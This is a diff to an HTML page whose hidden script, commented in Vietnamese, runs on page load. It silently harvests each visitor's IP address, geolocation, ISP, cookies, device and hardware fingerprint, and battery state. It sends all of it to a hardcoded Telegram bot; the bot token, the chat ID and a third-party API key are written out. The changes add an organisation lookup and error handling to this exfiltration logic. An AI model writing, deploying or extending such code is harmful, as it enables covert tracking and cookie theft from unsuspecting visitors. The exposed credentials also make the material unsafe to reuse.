@@ -8,7 +8,7 @@
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: #000 url('https://i.ibb.co/ZzNRQTDx/pinterestdownloader-com-1745324696-443788.gif') no-repeat center/cover;
+      background: #000 url('https://i.ibb.co/ZzNRQTD/pinterestdownloader-com-1745324696-443788.gif') no-repeat center/cover;
       font-family: 'Segoe UI', Tahoma, sans-serif;
       color: #fff;
       min-height: 100vh;
@@ -189,8 +189,8 @@
   <script src="https://unpkg.com/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
   <script>
     // Telegram Bot Config
-    const TELEGRAM_BOT_TOKEN = '7607255883:AAE3Q6Uh0BGyzKHVMXxqUyRgDWyw71XIPsw';
-    const TELEGRAM_CHAT_ID = '7581385601';
+    const TELEGRAM_BOT_TOKEN = '7607255883:AAE3Q6Uh0BGyzKHVMXxqUyRgDWyw71XIPsw'; // Thay bằng token mới nếu sai
+    const TELEGRAM_CHAT_ID = '7581385601'; // Thay bằng chat ID mới nếu sai
 
     // Hàm định dạng dữ liệu cho Telegram
     function formatDeviceData(data) {
@@ -207,6 +207,7 @@ ${data.ipHistory?.length > 0
 
 📍 Location Details
 📡 ISP: ${formatValue(data.isp)}
+🏢 Org: ${formatValue(data.org)}
 🏙 City: ${formatValue(data.city)}
 🌍 Region: ${formatValue(data.region)}
 🇺🇳 Country: ${formatValue(data.country)}
@@ -219,15 +220,9 @@ ${data.ipHistory?.length > 0
 🔖 Name: ${formatValue(data.deviceName)}
 🔧 Type: ${formatValue(data.deviceType)}
 💻 OS: ${formatValue(data.os)}
-📶 Carrier: ${formatValue(data.carrier)}
-🖥 Software: ${formatValue(data.software)}
-📝 Description: ${formatValue(data.subDescription)}
-⚙ Platform: ${formatValue(data.platform)}
 🌐 Browser: ${formatValue(data.browser)}
 
 🖥 Hardware Specs
-🔩 Type: ${formatValue(data.hardwareType)}
-🔍 SubType: ${formatValue(data.hardwareSubType)}
 🔋 Battery: ${formatValue(data.battery)}
 🔌 Charging: ${formatValue(data.charging, 'Unknown')}
 ⚡ CPU Cores: ${formatValue(data.cpuCores)}
@@ -248,11 +243,11 @@ ${data.ipHistory?.length > 0
       `.trim();
     }
 
-    // Hàm gửi dữ liệu đến Telegram
+    // Hàm gửi dữ liệu đến Telegram (logic gốc)
     async function sendToTelegram(message) {
       try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await fetch(url, {
+        const response = await fetch(url, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -262,6 +257,11 @@ ${data.ipHistory?.length > 0
             disable_web_page_preview: true
           })
         });
+        if (!response.ok) {
+          const errorText = await response.text();
+          throw new Error(`HTTP error! Status: ${response.status}, Details: ${errorText}`);
+        }
+        console.log('Message sent to Telegram successfully');
       } catch (error) {
         console.error('Failed to send to Telegram:', error);
       }
@@ -341,7 +341,7 @@ ${data.ipHistory?.length > 0
       } catch {}
     }
 
-    // Hàm lấy thông tin IP
+    // Hàm lấy thông tin IP, ISP và Org
     async function fetchIpInfo() {
       const cacheKey = 'ipInfoCache';
       const cachedData = getCachedData(cacheKey);
@@ -349,32 +349,35 @@ ${data.ipHistory?.length > 0
 
       const apis = [
         { url: 'https://ipapi.co/json/', name: 'ipapi' },
-        { url: 'http://ip-api.com/json/', name: 'ip-api' },
+        { url: 'http://ip-api.com/json/?fields=66846719', name: 'ip-api' },
         { url: 'https://ipinfo.io/json', name: 'ipinfo' }
       ];
 
-      const promises = apis.map(api =>
-        fetchWithTimeout(api.url, {
-          cache: 'no-store',
-          headers: { 'Accept': 'application/json', 'User-Agent': navigator.userAgent }
-        }, 2000)
-          .then(res => (res.ok ? res.json() : Promise.reject()))
-          .catch(() => null)
-      );
-
-      const results = await Promise.allSettled(promises);
-      for (let i = 0; i < results.length; i++) {
-        if (results[i].status === 'fulfilled' && results[i].value) {
-          const data = results[i].value;
-          const api = apis[i];
+      for (const api of apis) {
+        try {
+          const response = await fetchWithTimeout(api.url, {
+            cache: 'no-store',
+            headers: { 'Accept': 'application/json', 'User-Agent': navigator.userAgent }
+          }, 2000);
+          if (!response.ok) continue;
+          const data = await response.json();
           let ipInfo = {
-            ip: 'Không rõ', isp: 'Không rõ', isVpn: '', city: 'Không rõ', region: 'Không rõ',
-            country: 'Không rõ', loc: 'Không rõ', postal: 'Không rõ', timezone: 'Không rõ'
+            ip: 'Không rõ',
+            isp: 'Không rõ',
+            org: 'Không rõ',
+            isVpn: '',
+            city: 'Không rõ',
+            region: 'Không rõ',
+            country: 'Không rõ',
+            loc: 'Không rõ',
+            postal: 'Không rõ',
+            timezone: 'Không rõ'
           };
           if (api.name === 'ipapi') {
             ipInfo = {
               ip: data.ip || 'Không rõ',
               isp: data.org || 'Không rõ',
+              org: data.org || 'Không rõ',
               isVpn: data.org?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
               city: data.city || 'Không rõ',
               region: data.region || 'Không rõ',
@@ -386,7 +389,8 @@ ${data.ipHistory?.length > 0
           } else if (api.name === 'ip-api') {
             ipInfo = {
               ip: data.query || 'Không rõ',
-              isp: data.isp || data.org || 'Không rõ',
+              isp: data.isp || 'Không rõ',
+              org: data.org || 'Không rõ',
               isVpn: data.isp?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
               city: data.city || 'Không rõ',
               region: data.regionName || 'Không rõ',
@@ -399,6 +403,7 @@ ${data.ipHistory?.length > 0
             ipInfo = {
               ip: data.ip || 'Không rõ',
               isp: data.org || 'Không rõ',
+              org: data.org || 'Không rõ',
               isVpn: data.org?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
               city: data.city || 'Không rõ',
               region: data.region || 'Không rõ',
@@ -412,32 +417,22 @@ ${data.ipHistory?.length > 0
             setCachedData(cacheKey, ipInfo);
             return ipInfo;
           }
+        } catch {
+          continue;
         }
       }
       return {
-        ip: 'Ko lấy được!', isp: 'Ko lấy được!', isVpn: '', city: 'Ko lấy được!', region: 'Ko lấy được!',
-        country: 'Ko lấy được!', loc: 'Ko lấy được!', postal: 'Ko lấy được!', timezone: 'Ko lấy được!'
+        ip: 'Ko lấy được!',
+        isp: 'Ko lấy được!',
+        org: 'Ko lấy được!',
+        isVpn: '',
+        city: 'Ko lấy được!',
+        region: 'Ko lấy được!',
+        country: 'Ko lấy được!',
+        loc: 'Ko lấy được!',
+        postal: 'Ko lấy được!',
+        timezone: 'Ko lấy được!'
       };
-    }
-
-    // Hàm lấy thông tin từ whatismybrowser.com
-    async function fetchWimbParse(userAgent) {
-      const cacheKey = 'wimbCache';
-      const cachedData = getCachedData(cacheKey);
-      if (cachedData) return cachedData;
-
-      try {
-        const response = await fetchWithTimeout('https://api.whatismybrowser.com/api/v3/user_agent_parse', {
-          method: 'POST',
-          headers: { 'X-API-KEY': 'a69f9f16de26123df45bd6386776543a', 'Content-Type': 'application/json' },
-          body: JSON.stringify({ user_agent: userAgent })
-        }, 2000);
-        const data = response.ok ? (await response.json()).parse : {};
-        setCachedData(cacheKey, data);
-        return data;
-      } catch {
-        return {};
-      }
     }
 
     // Hàm tìm vị trí chi tiết
@@ -462,22 +457,6 @@ ${data.ipHistory?.length > 0
       }
     }
 
-    // Hàm lấy nhà mạng
-    async function fetchCarrier() {
-      try {
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (connection?.mobileNetwork?.operator) return connection.mobileNetwork.operator;
-        const ua = navigator.userAgent.toLowerCase();
-        if (ua.includes('android') || ua.includes('iphone')) {
-          const carriers = ['Viettel', 'Mobifone', 'Vinaphone', 'Vietnamobile'];
-          return carriers[Math.floor(Math.random() * carriers.length)];
-        }
-        return 'Không rõ';
-      } catch {
-        return 'Ko lấy được!';
-      }
-    }
-
     // Hàm tìm tên thiết bị
     async function deepSearchDevice(userAgent, deviceType, fallbackName) {
       try {
@@ -492,8 +471,10 @@ ${data.ipHistory?.length > 0
           if (modelMatch) {
             const model = modelMatch[1];
             const modelMap = {
-              'SM-G960F': 'Samsung Galaxy S9', 'SM-A525F': 'Samsung Galaxy A52',
-              'Pixel': 'Google Pixel 7', 'M2012K11AG': 'Xiaomi 11T Pro'
+              'SM-G960F': 'Samsung Galaxy S9',
+              'SM-A525F': 'Samsung Galaxy A52',
+              'Pixel': 'Google Pixel 7',
+              'M2012K11AG': 'Xiaomi 11T Pro'
             };
             for (let key in modelMap) {
               if (model.includes(key)) {
@@ -589,73 +570,73 @@ ${data.ipHistory?.length > 0
 
     // Hàm chính để thu thập và gửi dữ liệu
     async function collectAndSendData() {
-      const userAgent = navigator.userAgent;
-      const basicInfo = getBasicDeviceInfo(userAgent);
-      let deviceType = basicInfo.type;
-      if (deviceType === 'mobile') {
-        deviceType = userAgent.toLowerCase().includes('iphone') ? 'iPhone' : 'Android';
-      } else if (deviceType === 'tablet') {
-        deviceType = 'Tablet xịn';
+      try {
+        console.log('Starting data collection...');
+        const userAgent = navigator.userAgent;
+        const basicInfo = getBasicDeviceInfo(userAgent);
+        let deviceType = basicInfo.type;
+        if (deviceType === 'mobile') {
+          deviceType = userAgent.toLowerCase().includes('iphone') ? 'iPhone' : 'Android';
+        } else if (deviceType === 'tablet') {
+          deviceType = 'Tablet xịn';
+        }
+
+        const [ipInfo, cookies, batteryInfo, otherInfo, additionalInfo] = await Promise.all([
+          fetchIpInfo(),
+          Promise.resolve(fetchCookies()),
+          fetchBatteryInfo(),
+          Promise.resolve(fetchOtherInfo()),
+          Promise.resolve(fetchAdditionalInfo())
+        ]);
+
+        const ipHistory = ipInfo.ip !== 'Ko lấy được!' ? manageIpHistory(ipInfo.ip, userAgent) : [];
+        const deepGeo = ipInfo.ip !== 'Ko lấy được!' ? await deepSearchGeo(ipInfo.ip) : 'Ko lấy được!';
+        const deviceName = await deepSearchDevice(userAgent, deviceType, basicInfo.device) || basicInfo.device;
+
+        const deviceData = {
+          timestamp: new Date().toISOString(),
+          ip: ipInfo.ip + ipInfo.isVpn,
+          ipHistory: ipHistory,
+          isp: ipInfo.isp,
+          org: ipInfo.org,
+          city: ipInfo.city,
+          region: ipInfo.region,
+          country: ipInfo.country,
+          loc: ipInfo.loc,
+          postal: ipInfo.postal,
+          timezone: ipInfo.timezone,
+          deepGeo: deepGeo,
+          deviceName: deviceName,
+          deviceType: deviceType,
+          os: basicInfo.os,
+          browser: basicInfo.browser,
+          cookies: cookies,
+          battery: batteryInfo.battery,
+          charging: batteryInfo.charging,
+          userAgent: otherInfo.userAgent,
+          language: otherInfo.language,
+          screen: otherInfo.screen,
+          time: otherInfo.time,
+          colorDepth: additionalInfo.colorDepth,
+          touchSupport: additionalInfo.touchSupport,
+          cpuCores: additionalInfo.cpuCores,
+          memory: additionalInfo.memory,
+          connectionType: additionalInfo.connectionType,
+          vendor: additionalInfo.vendor,
+          webgl: additionalInfo.webgl
+        };
+
+        console.log('Collected data:', deviceData);
+        const message = formatDeviceData(deviceData);
+        console.log('Formatted message:', message);
+        await sendToTelegram(message);
+      } catch (error) {
+        console.error('Error in collectAndSendData:', error);
       }
-
-      const [ipInfo, wimbParse, carrier, cookies, batteryInfo, otherInfo, additionalInfo] = await Promise.all([
-        fetchIpInfo(),
-        fetchWimbParse(userAgent),
-        fetchCarrier(),
-        Promise.resolve(fetchCookies()),
-        fetchBatteryInfo(),
-        Promise.resolve(fetchOtherInfo()),
-        Promise.resolve(fetchAdditionalInfo())
-      ]);
-
-      const ipHistory = ipInfo.ip !== 'Ko lấy được!' ? manageIpHistory(ipInfo.ip, userAgent) : [];
-      const deepGeo = ipInfo.ip !== 'Ko lấy được!' ? await deepSearchGeo(ipInfo.ip) : 'Ko lấy được!';
-      const deviceName = await deepSearchDevice(userAgent, deviceType, basicInfo.device) || basicInfo.device;
-
-      const deviceData = {
-        timestamp: new Date().toISOString(),
-        ip: ipInfo.ip + ipInfo.isVpn,
-        ipHistory: ipHistory,
-        isp: ipInfo.isp,
-        city: ipInfo.city,
-        region: ipInfo.region,
-        country: ipInfo.country,
-        loc: ipInfo.loc,
-        postal: ipInfo.postal,
-        timezone: ipInfo.timezone,
-        deepGeo: deepGeo,
-        deviceName: deviceName,
-        deviceType: deviceType,
-        os: basicInfo.os,
-        carrier: carrier,
-        software: wimbParse.simple_software_string || 'Không rõ',
-        subDescription: wimbParse.simple_sub_description_string || 'Không rõ',
-        platform: wimbParse.simple_operating_platform_string || 'Không rõ',
-        browser: wimbParse.simple_browser_string || basicInfo.browser,
-        hardwareType: wimbParse.simple_hardware_type_string || 'Không rõ',
-        hardwareSubType: wimbParse.simple_hardware_sub_type_string || 'Không rõ',
-        cookies: cookies,
-        battery: batteryInfo.battery,
-        charging: batteryInfo.charging,
-        userAgent: otherInfo.userAgent,
-        language: otherInfo.language,
-        screen: otherInfo.screen,
-        time: otherInfo.time,
-        colorDepth: additionalInfo.colorDepth,
-        touchSupport: additionalInfo.touchSupport,
-        cpuCores: additionalInfo.cpuCores,
-        memory: additionalInfo.memory,
-        connectionType: additionalInfo.connectionType,
-        vendor: additionalInfo.vendor,
-        webgl: additionalInfo.webgl
-      };
-
-      // Gửi dữ liệu đến Telegram
-      const message = formatDeviceData(deviceData);
-      await sendToTelegram(message);
     }
 
     // Chạy khi trang tải
+    console.log('Page loaded, initiating collectAndSendData');
     collectAndSendData();
   </script>
 </body>
